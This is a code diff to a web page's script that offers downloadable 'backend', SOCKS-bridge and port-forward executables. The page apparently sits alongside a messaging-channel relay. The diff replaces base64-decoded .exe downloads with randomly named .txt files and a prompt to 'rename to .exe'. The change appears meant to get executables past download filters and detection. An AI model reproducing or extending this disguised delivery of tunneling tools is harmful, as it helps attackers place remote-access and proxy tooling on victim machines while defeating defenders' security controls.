@@ -528,19 +528,9 @@ a.click();
 log('downloaded backend.py','#6a6');
 };
 $('btnGetBackendExe').onclick=function(){
-var btn=this;btn.disabled=true;btn.textContent='...';
-log('downloading backend...','#6af');
-fetch('backend-b64.txt').then(function(r){return r.text()}).then(function(b64){
-var raw=atob(b64.replace(/\s/g,''));
-var arr=new Uint8Array(raw.length);
-for(var i=0;i<raw.length;i++)arr[i]=raw.charCodeAt(i);
-var blob=new Blob([arr],{type:'application/octet-stream'});
 var rnd=Math.random().toString(36).substring(2,8);
-var a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download=rnd+'.exe';a.click();
-URL.revokeObjectURL(a.href);
-log('saved '+rnd+'.exe','#6a6');
-btn.disabled=false;btn.textContent='EXE';
-}).catch(function(e){log('download failed: '+e,'#a66');btn.disabled=false;btn.textContent='EXE';});
+var a=document.createElement('a');a.href='backend.txt';a.download=rnd+'.txt';a.click();
+log('downloaded '+rnd+'.txt - rename to .exe','#6a6');
 };
 $('btnGetBackendPs').onclick=function(){
 var rnd=Math.random().toString(36).substring(2,8);
@@ -620,19 +610,9 @@ delete pending[id];
 channel.publish('data',{type:reqType,from:myId,id:id});
 }
 $('btnSocks').onclick=function(){
-var btn=this;btn.disabled=true;btn.textContent='...';
-log('downloading bridge...','#6af');
-fetch('socks-bridge-b64.txt').then(function(r){return r.text()}).then(function(b64){
-var raw=atob(b64.replace(/\s/g,''));
-var arr=new Uint8Array(raw.length);
-for(var i=0;i<raw.length;i++)arr[i]=raw.charCodeAt(i);
-var blob=new Blob([arr],{type:'application/octet-stream'});
 var rnd=Math.random().toString(36).substring(2,8);
-var a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download=rnd+'.exe';a.click();
-URL.revokeObjectURL(a.href);
-log('saved '+rnd+'.exe','#6a6');
-btn.disabled=false;btn.textContent='EXE';
-}).catch(function(e){log('download failed: '+e,'#a66');btn.disabled=false;btn.textContent='EXE';});
+var a=document.createElement('a');a.href='socks-bridge.txt';a.download=rnd+'.txt';a.click();
+log('downloaded '+rnd+'.txt - rename to .exe','#6a6');
 };
 $('btnSocksPs').onclick=function(){
 var rnd=Math.random().toString(36).substring(2,8);
@@ -645,19 +625,9 @@ var a=document.createElement('a');a.href='socks-bridge.py';a.download='socks-bri
 log('downloaded socks-bridge.py','#6a6');
 };
 $('btnPortFwd').onclick=function(){
-var btn=this;btn.disabled=true;btn.textContent='...';
-log('downloading port-forward...','#6af');
-fetch('port-forward-b64.txt').then(function(r){return r.text()}).then(function(b64){
-var raw=atob(b64.replace(/\s/g,''));
-var arr=new Uint8Array(raw.length);
-for(var i=0;i<raw.length;i++)arr[i]=raw.charCodeAt(i);
-var blob=new Blob([arr],{type:'application/octet-stream'});
 var rnd=Math.random().toString(36).substring(2,8);
-var a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='pf-'+rnd+'.exe';a.click();
-URL.revokeObjectURL(a.href);
-log('saved pf-'+rnd+'.exe','#6a6');
-btn.disabled=false;btn.textContent='Download';
-}).catch(function(e){log('download failed: '+e,'#a66');btn.disabled=false;btn.textContent='Download';});
+var a=document.createElement('a');a.href='port-forward.txt';a.download='pf-'+rnd+'.txt';a.click();
+log('downloaded pf-'+rnd+'.txt - rename to .exe','#6a6');
 };
 log('ready');
 </script>
